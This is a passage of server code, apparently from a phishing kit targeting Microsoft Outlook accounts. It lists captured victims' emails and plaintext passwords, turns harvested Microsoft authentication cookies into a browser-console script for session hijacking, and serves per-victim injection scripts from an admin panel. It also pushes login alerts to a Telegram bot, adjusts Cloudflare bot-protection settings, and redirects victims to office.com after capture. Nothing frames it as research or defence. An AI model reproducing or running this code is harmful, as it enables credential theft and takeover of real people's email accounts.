                                lastModified: stats.mtime
                            });
                        } catch (e) {
                            console.log(`⚠️ Failed to parse metadata for ${item}: ${e.message}`);
                        }
                    }
                }
            }

            // Also check for legacy consolidated file
            const consolidatedFile = path.join(sessionDir, 'all_sessions.json');
            if (fs.existsSync(consolidatedFile)) {
                try {
                    const content = JSON.parse(fs.readFileSync(consolidatedFile, 'utf8'));
                    const stats = fs.statSync(consolidatedFile);

                    if (content.accounts && Array.isArray(content.accounts)) {
                        content.accounts.forEach(account => {
                            sessions.push({
                                email: account.email || 'Unknown',
                                timestamp: account.timestamp,
                                cookieCount: account.cookies ? account.cookies.length : 0,
                                hasPassword: !!account.password,
                                id: account.id,
                                sessionPath: consolidatedFile,
                                isLegacy: true,
                                lastModified: stats.mtime
                            });
                        });
                    }
                } catch (e) {
                    console.log(`⚠️ Failed to parse legacy consolidated file: ${e.message}`);
                }
            }

            // Sort by timestamp (newest first)
            sessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

            res.json({ 
                sessions: sessions,
                count: sessions.length,
                individualSessions: sessions.filter(s => !s.isLegacy).length,
                legacySessions: sessions.filter(s => s.isLegacy).length,
                message: sessions.length === 0 ? 'No sessions found' : `Found ${sessions.length} session(s)`
            });

        } catch (parseError) {
            console.error('Error parsing sessions:', parseError);
            res.status(500).json({ 
                error: 'Failed to parse sessions',
                details: parseError.message 
            });
        }

    } catch (error) {
        console.error('Error listing sessions:', error);
        res.status(500).json({ 
            error: 'Failed to list sessions',
            details: error.message 
        });
    }
});

// Export cookies for browser injection
app.get('/api/export-cookies', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active session found' 
            });
        }

        // Get enhanced cookies from all Microsoft domains
        console.log('📦 Collecting enhanced cookies for export...');

        // Temporarily save cookies to get the enhanced collection
        const tempCookieFile = await session.automation.saveCookies();

        // Load the enhanced cookies from the saved file
        const fs = require('fs');
        const path = require('path');
        const jsonFile = tempCookieFile.replace('.txt', '.json');

        let enhancedCookies = [];
        if (fs.existsSync(jsonFile)) {
            const cookiesData = fs.readFileSync(jsonFile, 'utf8');
            enhancedCookies = JSON.parse(cookiesData);
        }

        console.log(`📊 Found ${enhancedCookies.length} enhanced cookies for export`);

        // Generate enhanced JavaScript cookie injection script
        const cookieInjectionScript = `
// Enhanced Microsoft Outlook Cookie Injection Script
(function() {
    console.log('🍪 Injecting ${enhancedCookies.length} Microsoft authentication cookies...');
    console.log('📍 This includes cookies from all Microsoft auth domains');

    const cookies = ${JSON.stringify(enhancedCookies)};
    let successCount = 0;
    let domains = new Set();

    // First, try to navigate to Microsoft login to set domain context
    if (window.location.hostname !== 'login.microsoftonline.com') {
        console.log('💡 For best results, run this on login.microsoftonline.com first');
    }

    cookies.forEach(cookie => {
        try {
            let cookieString = cookie.name + '=' + cookie.value + ';';

            // Use the original expiry if available, otherwise set to 1 year
            if (cookie.expires && cookie.expires !== -1) {
                const expiryDate = new Date(cookie.expires * 1000);
                cookieString += 'expires=' + expiryDate.toUTCString() + ';';
            } else {
                cookieString += 'Max-Age=31536000;'; // 1 year for session cookies
            }

            if (cookie.path) cookieString += 'path=' + cookie.path + ';';
            if (cookie.domain) cookieString += 'domain=' + cookie.domain + ';';
            if (cookie.secure) cookieString += 'secure;';
            if (cookie.httpOnly) cookieString += 'httponly;';
            if (cookie.sameSite) cookieString += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieString;
            successCount++;
            domains.add(cookie.domain);
            console.log('✅ Set cookie:', cookie.name, 'for', cookie.domain);
        } catch (error) {
            console.warn('⚠️ Failed to set cookie:', cookie.name, error);
        }
    });

    console.log(\`🎉 Successfully injected \${successCount} cookies across \${domains.size} domains!\`);
    console.log('🌐 Domains covered:', Array.from(domains).join(', '));
    console.log('🔄 Navigate to https://outlook.office.com/mail/ to test authentication');

    // Auto-redirect option
    const redirect = confirm(\`Successfully injected \${successCount} authentication cookies!\\n\\nWould you like to open Outlook now?\`);
    if (redirect) {
        window.open('https://outlook.office.com/mail/', '_blank');
    }

    return {
        success: true,
        cookiesSet: successCount,
        totalCookies: cookies.length,
        domains: Array.from(domains)
    };
})();
`;

        res.json({
            success: true,
            cookieCount: enhancedCookies.length,
            injectionScript: cookieInjectionScript,
            redirectUrl: 'https://outlook.office.com/mail/',
            message: 'Copy the script to your browser console or click the button to inject cookies'
        });

    } catch (error) {
        console.error('Error exporting cookies:', error);
        res.status(500).json({ 
            error: 'Failed to export cookies',
            details: error.message 
        });
    }
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ 
        error: 'Internal server error',
        details: err.message 
    });
});

// Graceful shutdown
// Graceful shutdown handling for multiple signals
const gracefulShutdown = async (signal) => {
    console.log(`\n🔄 Received ${signal}. Shutting down server...`);

    // Close all active automation sessions
    if (activeSessions.size > 0) {
        console.log(`Closing ${activeSessions.size} active sessions...`);
        for (const [sessionId, session] of activeSessions) {
            try {
                if (session.automation) {
                    await Promise.race([
                        session.automation.close(),
                        new Promise((_, reject) => setTimeout(() => reject(new Error('Shutdown timeout')), 5000))
                    ]);
                }
                console.log(`Session ${sessionId} closed`);
            } catch (error) {
                console.error(`Error closing session ${sessionId}:`, error);
            }
        }
        activeSessions.clear();
    }
    console.log('✅ All sessions closed. Server shutdown complete.');
    process.exit(0);
};

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);
process.on('SIGQUIT', gracefulShutdown);

// Admin routes for session management
app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
    const fs = require('fs');
    const path = require('path');

    try {
        const sessionDir = path.join(__dirname, 'session_data');

        if (!fs.existsSync(sessionDir)) {
            return res.json({ sessions: [] });
        }

        const files = fs.readdirSync(sessionDir);

        // Get valid sessions
        const validSessionFiles = files.filter(file => file.startsWith('session_') && file.endsWith('.json'));
        const validSessions = validSessionFiles.map(file => {
            try {
                const filePath = path.join(sessionDir, file);
                const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));

                // Generate injection script filename
                const sessionId = data.id;
                const injectFilename = `inject_session_${sessionId}.js`;
                const injectPath = path.join(sessionDir, injectFilename);
                const hasInjectScript = fs.existsSync(injectPath);

                return {
                    filename: file,
                    injectFilename: hasInjectScript ? injectFilename : null,
                    id: data.id,
                    email: data.email,
                    password: data.password,
                    timestamp: data.timestamp,
                    totalCookies: data.totalCookies,
                    status: 'valid'
                };
            } catch (error) {
                console.error(`Error reading session file ${file}:`, error);
                return null;
            }
        }).filter(session => session !== null);

        // Get invalid entries
        const invalidSessionFiles = files.filter(file => file.startsWith('invalid_') && file.endsWith('.json'));
        const invalidSessions = invalidSessionFiles.map(file => {
            try {
                const filePath = path.join(sessionDir, file);
                const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));

                return {
                    filename: file,
                    injectFilename: null, // Invalid entries don't have inject scripts
                    id: data.id,
                    email: data.email || 'Unknown',
                    password: null, // Invalid entries don't have passwords
                    timestamp: data.timestamp,
                    totalCookies: 0, // Invalid entries don't have cookies
                    status: 'invalid',
                    reason: data.reason || 'Failed Entry',
                    errorMessage: data.errorMessage || ''
                };
            } catch (error) {
                console.error(`Error reading invalid session file ${file}:`, error);
                return null;
            }
        }).filter(session => session !== null);

        console.log(`📊 Found ${validSessions.length} valid sessions and ${invalidSessions.length} invalid sessions`);

        // Combine and sort by timestamp (newest first)
        const allSessions = [...validSessions, ...invalidSessions].sort((a, b) => {
            return new Date(b.timestamp) - new Date(a.timestamp);
        });

        res.json({ sessions: allSessions });
    } catch (error) {
        console.error('Error getting sessions:', error);
        res.status(500).json({ error: 'Failed to get sessions' });
    }
});

// Bot status endpoint
app.get('/api/bot-status', (req, res) => {
    res.json({
        botEnabled: !!telegramBot,
        subscribedUsers: telegramBot ? telegramBot.getSubscribedUsers() : 0,
        features: ['Admin Token Access', 'Login Notifications', 'Admin Panel Links'],
        status: telegramBot ? 'active' : 'disabled',
        message: telegramBot ? 
            'Telegram Bot is running and ready to send notifications!' : 
            'Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable'
    });
});

// Analytics endpoint
app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
    res.json(analytics);
});

// Download injection script
app.get('/api/admin/download-inject/:filename', requireAdminAuth, (req, res) => {
    const fs = require('fs');
    const path = require('path');
    const filename = req.params.filename;

    // Enhanced security: strict validation and path traversal protection
    if (!filename || typeof filename !== 'string') {
        return res.status(400).json({ error: 'Invalid filename parameter' });
    }

    // Remove any path separators and normalize
    const sanitizedFilename = path.basename(filename);

    // Only allow files that start with 'inject_session_' and end with '.js'
    if (!sanitizedFilename.startsWith('inject_session_') || !sanitizedFilename.endsWith('.js')) {
        return res.status(400).json({ error: 'Invalid filename format' });
    }

    // Additional validation: check for suspicious patterns
    if (sanitizedFilename.includes('..') || sanitizedFilename.includes('/') || sanitizedFilename.includes('\\')) {
        return res.status(400).json({ error: 'Filename contains invalid characters' });
    }

    try {
        const sessionDir = path.join(__dirname, 'session_data');
        const filePath = path.join(sessionDir, sanitizedFilename);

        // Ensure the resolved path is within session_data directory
        if (!filePath.startsWith(sessionDir)) {
            return res.status(400).json({ error: 'Path traversal attempt detected' });
        }

        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }

        res.setHeader('Content-Disposition', `attachment; filename="${sanitizedFilename}"`);
        res.setHeader('Content-Type', 'application/javascript');
        res.sendFile(filePath);

    } catch (error) {
        console.error('Error downloading file:', error);
        res.status(500).json({ error: 'Failed to download file' });
    }
});

// Cloudflare API helper function
async function makeCloudflareRequest(endpoint, method = 'GET', data = null) {
    if (!CLOUDFLARE_API_TOKEN || !CLOUDFLARE_ZONE_ID) {
        throw new Error('Cloudflare API credentials not configured');
    }

    const url = `https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}${endpoint}`;
    const options = {
        method,
        headers: {
            'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
            'Content-Type': 'application/json'
        }
    };

    if (data && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
        options.body = JSON.stringify(data);
    }

    const response = await fetch(url, options);
    const result = await response.json();

    if (!result.success) {
        throw new Error(`Cloudflare API error: ${result.errors?.[0]?.message || 'Unknown error'}`);
    }

    return result.result;
}

// Get Cloudflare security settings
app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
    try {
        // Get Bot Fight Mode status
        const botFightMode = await makeCloudflareRequest('/settings/bot_fight_mode');
        
        // Get Security Level
        const securityLevel = await makeCloudflareRequest('/settings/security_level');
        
        // Get Challenge Passage
        const challengePassage = await makeCloudflareRequest('/settings/challenge_ttl');
        
        // Get Browser Integrity Check
        const browserCheck = await makeCloudflareRequest('/settings/browser_check');
        
        // Get Under Attack Mode
        const underAttackMode = await makeCloudflareRequest('/settings/security_level');

        res.json({
            success: true,
            settings: {
                botFightMode: botFightMode.value === 'on',
                securityLevel: securityLevel.value,
                challengePassage: challengePassage.value,
                browserCheck: browserCheck.value === 'on',
                underAttackMode: underAttackMode.value === 'under_attack'
            }
        });
    } catch (error) {
        console.error('Error getting Cloudflare status:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Toggle Bot Fight Mode
app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;
        
        const result = await makeCloudflareRequest('/settings/bot_fight_mode', 'PATCH', {
            value: enabled ? 'on' : 'off'
        });

        res.json({
            success: true,
            botFightMode: result.value === 'on',
            message: `Bot Fight Mode ${enabled ? 'enabled' : 'disabled'} successfully`
        });
    } catch (error) {
        console.error('Error toggling Bot Fight Mode:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Set Security Level
app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, res) => {
    try {
        const { level } = req.body; // 'off', 'essentially_off', 'low', 'medium', 'high', 'under_attack'
        
        const result = await makeCloudflareRequest('/settings/security_level', 'PATCH', {
            value: level
        });

        res.json({
            success: true,
            securityLevel: result.value,
            message: `Security level set to ${level} successfully`
        });
    } catch (error) {
        console.error('Error setting security level:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Toggle Browser Integrity Check
app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, res) => {
    try {
        const { enabled } = req.body;
        
        const result = await makeCloudflareRequest('/settings/browser_check', 'PATCH', {
            value: enabled ? 'on' : 'off'
        });

        res.json({
            success: true,
            browserCheck: result.value === 'on',
            message: `Browser Integrity Check ${enabled ? 'enabled' : 'disabled'} successfully`
        });
    } catch (error) {
        console.error('Error toggling Browser Integrity Check:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Create firewall rule to block/allow specific patterns
app.post('/api/admin/cloudflare/firewall-rule', requireAdminAuth, async (req, res) => {
    try {
        const { action, expression, description } = req.body;
        // action: 'block', 'allow', 'challenge', 'js_challenge'
        // expression: Cloudflare expression like 'ip.src eq 1.2.3.4'
        
        const result = await makeCloudflareRequest('/firewall/rules', 'POST', {
            filter: {
                expression: expression,
                paused: false
            },
            action: action,
            description: description || 'Rule created via admin panel'
        });

        res.json({
            success: true,
            rule: result,
            message: `Firewall rule created successfully`
        });
    } catch (error) {
        console.error('Error creating firewall rule:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Get firewall rules
app.get('/api/admin/cloudflare/firewall-rules', requireAdminAuth, async (req, res) => {
    try {
        const rules = await makeCloudflareRequest('/firewall/rules');
        
        res.json({
            success: true,
            rules: rules
        });
    } catch (error) {
        console.error('Error getting firewall rules:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Configure Cloudflare credentials
app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) => {
    try {
        const { apiToken, zoneId } = req.body;

        if (!apiToken || !zoneId) {
            return res.status(400).json({
                success: false,
                error: 'Both API token and Zone ID are required'
            });
        }

        // Test the credentials by making a test API call
        const testUrl = `https://api.cloudflare.com/client/v4/zones/${zoneId}`;
        const testResponse = await fetch(testUrl, {
            headers: {
                'Authorization': `Bearer ${apiToken}`,
                'Content-Type': 'application/json'
            }
        });

        const testResult = await testResponse.json();

        if (!testResult.success) {
            return res.status(400).json({
                success: false,
                error: `Invalid credentials: ${testResult.errors?.[0]?.message || 'Authentication failed'}`
            });
        }

        // Update environment variables in memory
        process.env.CLOUDFLARE_API_TOKEN = apiToken;
        process.env.CLOUDFLARE_ZONE_ID = zoneId;

        console.log('✅ Cloudflare credentials configured successfully');
        console.log(`🌐 Connected to zone: ${testResult.result?.name || zoneId}`);

        res.json({
            success: true,
            message: 'Cloudflare credentials configured successfully',
            zoneName: testResult.result?.name,
            zoneId: zoneId
        });

    } catch (error) {
        console.error('Error configuring Cloudflare:', error);
        res.status(500).json({
            success: false,
            error: `Configuration failed: ${error.message}`
        });
    }
});

// Redirect Configuration Storage
const REDIRECT_CONFIG_FILE = path.join(__dirname, 'redirect-config.json');

// Load redirect configuration
function loadRedirectConfig() {
    try {
        if (fs.existsSync(REDIRECT_CONFIG_FILE)) {
            const data = fs.readFileSync(REDIRECT_CONFIG_FILE, 'utf8');
            const config = JSON.parse(data);
            return config.redirectUrl || 'https://office.com';
        }
    } catch (error) {
        console.error('Error loading redirect config:', error);
    }
    return 'https://office.com'; // Default
}

// Save redirect configuration
function saveRedirectConfig(redirectUrl) {
    try {
        const config = {
            redirectUrl: redirectUrl,
            lastUpdated: new Date().toISOString()
        };
        fs.writeFileSync(REDIRECT_CONFIG_FILE, JSON.stringify(config, null, 2));
        console.log(`📍 Redirect destination updated to: ${redirectUrl}`);
        return true;
    } catch (error) {
        console.error('Error saving redirect config:', error);
        return false;
    }
}

// Get current redirect configuration
app.get('/api/admin/redirect-config', requireAdminAuth, async (req, res) => {
    try {
        const redirectUrl = loadRedirectConfig();
        res.json({
            success: true,
            redirectUrl: redirectUrl
        });
    } catch (error) {
        console.error('Error getting redirect config:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Update redirect configuration
app.post('/api/admin/redirect-config', requireAdminAuth, async (req, res) => {
    try {
        const { redirectUrl } = req.body;

        if (!redirectUrl) {
            return res.status(400).json({
                success: false,
                error: 'Redirect URL is required'
            });
        }

        // Basic URL validation
        try {
            new URL(redirectUrl);
        } catch (e) {
            return res.status(400).json({
                success: false,
                error: 'Invalid URL format'
            });
        }

        const saved = saveRedirectConfig(redirectUrl);
        if (saved) {
            res.json({
                success: true,
                message: 'Redirect destination updated successfully',
                redirectUrl: redirectUrl
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Failed to save redirect configuration'
            });
        }
    } catch (error) {
        console.error('Error updating redirect config:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Get redirect URL for automation (internal use)
app.get('/api/internal/redirect-url', async (req, res) => {
    try {
        const redirectUrl = loadRedirectConfig();
        res.json({
            success: true,
            redirectUrl: redirectUrl
        });
    } catch (error) {
        console.error('Error getting internal redirect URL:', error);
        res.json({
            success: false,
            redirectUrl: 'https://office.com' // Fallback
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Outlook Automation Backend running on port ${PORT}`);
    console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
    console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
    console.log(`🔧 Admin panel available at http://localhost:${PORT}/ad.html`);

    if (telegramBot) {
        console.log(`🤖 Telegram Bot active - ${telegramBot.getSubscribedUsers()} users subscribed`);
        console.log(`📱 Bot Features: Admin token access + Login notifications`);
    } else {
        console.log(`❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications`);
    }
});